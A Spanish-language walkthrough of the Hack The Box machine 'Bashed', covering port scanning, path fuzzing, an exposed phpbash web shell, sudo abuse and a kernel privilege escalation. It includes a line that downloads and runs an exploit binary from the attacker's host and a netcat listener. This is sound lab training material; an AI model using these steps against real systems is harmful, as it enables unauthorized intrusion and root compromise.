---
title: Bashed
parent: Easy
nav_order: 2
---

# Walkthrough — Bashed (Hack The Box)
{: .fs-9 }

> Recorrido por la máquina *Bashed*, enfocada en la exposición de scripts en producción y una clásica escalada de privilegios local.
{: .fs-6 .fw-300 }

---

## 🧭 Introducción

**Bashed** es una máquina *Easy* de Hack The Box, ideal para practicar acceso inicial a través de archivos expuestos y escalar con una vieja gloria de los exploits de kernel. ¡Clásica, simple y efectiva!

- SO: Linux (Ubuntu 16.04)  
- Dificultad: Easy  
- Herramientas utilizadas: `nmap`, `ffuf`, `netcat`, `gcc`, `python3`, `wget`

---

## 🔎 Enumeración inicial

Lancé un escaneo completo con `nmap` para ver qué servicios estaban vivos:

```bash
nmap -sC -sV -p- -T4 10.10.10.68
```

> `-p-`: todos los puertos  
> `-sC -sV`: scripts por defecto y detección de versiones  
> `-T4`: velocidad decente sin romper cosas

![Nmap scan](/assets/images/bashed/01-nmap.png)

Resultado:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
```

Sólo un puerto abierto: **HTTP**. Sencillo, pero esto suele ser una señal de que lo jugoso está en la web.

---

## 🌐 Exploración web

Navegando a `http://10.10.10.68` encontré algo interesante…

![Página principal](/assets/images/bashed/02-mainpage.png)

Un sitio personal de desarrollo, y en él se menciona explícitamente el uso de **phpsbash**... ¿en producción?

> *"I actually developed it on this exact server"*

Gracias, desarrollador desconocido. 🎯

---

## 🕵️ Fuzzing de rutas

Para buscar rutas ocultas, utilicé `ffuf` con una wordlist de Seclists:

```bash
ffuf -u http://10.10.10.68/FUZZ \
-w /path/to/SecLists/Discovery/Web-Content/common.txt \
-mc 200,204,301,302,307,403 \
-fs 401 -t 40
```

![ffuf en acción](/assets/images/bashed/03-ffuf.png)

El resultado me reveló `/dev/`.

---

## 🛠️ phpBash en /dev/

Visitando `http://10.10.10.68/dev/`:

![Directorio dev](/assets/images/bashed/04-dev-dir.png)

Y sí… hay dos versiones de **phpsbash**. Ejecuté la principal:

![phpbash cargado](/assets/images/bashed/05-phpsbash-loaded.png)

Y conseguí una shell como `www-data`. ¡Vamos!

---

## 📡 Mejorando acceso y reverse shell

Monté un listener:

```bash
nc -lnvp 1234
```

![nc escuchando](/assets/images/bashed/06-nc-listen.png)

Y desde la consola web, lancé una reverse shell o mejoré la tty con:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![TTY mejorada](/assets/images/bashed/07-tty.png)

---

## 🧑‍💻 Flag de usuario

Navegando al home del usuario `arrexel`, encontré `user.txt`:

```bash
cat /home/arrexel/user.txt
```

![Flag usuario](/assets/images/bashed/08-user-flag.png)

Primera flag lista ✅

---

## ⬆️ Escalada de privilegios

Corrí `sudo -l` y encontré esto:

```bash
User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

![sudo -l](/assets/images/bashed/09-sudo-l.png)

Eso significa que puedo ser `scriptmanager` sin contraseña:

```bash
sudo -u scriptmanager /bin/bash
```

![shell como scriptmanager](/assets/images/bashed/10-scriptmanager.png)

---

## 🧠 Post-enumeración

Con acceso como `scriptmanager`, revisé el kernel con `uname -a`:

![uname](/assets/images/bashed/11-uname.png)

Es un kernel vulnerable: `4.4.0-62`. En *ExploitDB* encontré una escalada local lista para usar.

---

## 💥 Explotación local — DirtyCow/Overlayfs

El exploit (`exploit.c`) se compila así:

```bash
gcc exploit.c -o rootme -static -O2
```

![Compilación](/assets/images/bashed/12-compile.png)

Serví el binario con Python:

```bash
sudo python3 -m http.server 80
```

![Servidor HTTP](/assets/images/bashed/13-http-server.png)

Y lo descargué desde la máquina víctima:

```bash
wget http://10.10.14.3/rootme -O /tmp/rootme
chmod +x /tmp/rootme
/tmp/rootme
```

![Transferencia y ejecución](/assets/images/bashed/14-transfer.png)

---

## 🧑‍🚀 ¡Root shell!

El exploit funcionó y me dio una shell como **root**:

![Shell root](/assets/images/bashed/15-root-shell.png)

---

## 🏁 Flag de root

La cereza del postre: `/root/root.txt`

```bash
cat /root/root.txt
```

![root.txt](/assets/images/bashed/16-root-flag.png)

🎉 ¡Máquina completada!

---

## ✅ Resumen final

| Acción | Resultado |
|--------|-----------|
| Escaneo inicial | Apache en puerto 80 |
| Enumeración web | phpBash expuesto |
| Acceso inicial | Shell como `www-data` |
| Escalada 1 | Sudo a `scriptmanager` |
| Escalada 2 | Exploit local al kernel |
| Flags | `user.txt` y `root.txt` ✔️ |

---

**Autor:** [gueco99](https://github.com/gueco99)  
🧠 Hack the Box – *Bashed* (Easy)
